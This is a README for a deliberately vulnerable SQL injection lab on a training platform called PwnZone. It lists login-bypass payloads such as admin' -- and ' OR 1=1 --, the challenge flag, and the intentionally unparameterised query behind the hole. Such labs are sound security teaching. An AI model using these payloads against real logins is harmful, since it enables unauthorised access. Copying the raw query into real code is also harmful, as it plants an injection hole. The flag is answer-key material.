# SQLi Authentication Bypass Lab

A standalone vulnerable web app for the PwnZone platform.

## Stack
- Node.js + Express
- SQLite (in-memory, `better-sqlite3`) — resets on every restart
- Runs on **port 5174**

## Start
```bash
npm install
npm start
```

Login page: http://localhost:5174/login?lab=sqli-auth

## Objective
Bypass the login form using SQL injection without knowing any valid password.

## Example Payloads
| Username field       | Password field | Result              |
|----------------------|----------------|---------------------|
| `admin' --`          | anything       | Bypass as admin     |
| `' OR '1'='1' --`    | anything       | Bypass as first user|
| `' OR 1=1 --`        | anything       | Bypass as first user|

## Flag
`FLAG{tm-01-sql-injection}`

## How it works
The backend runs this raw query (intentionally vulnerable):
```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
```
No parameterisation. No sanitisation. Classic SQLi.
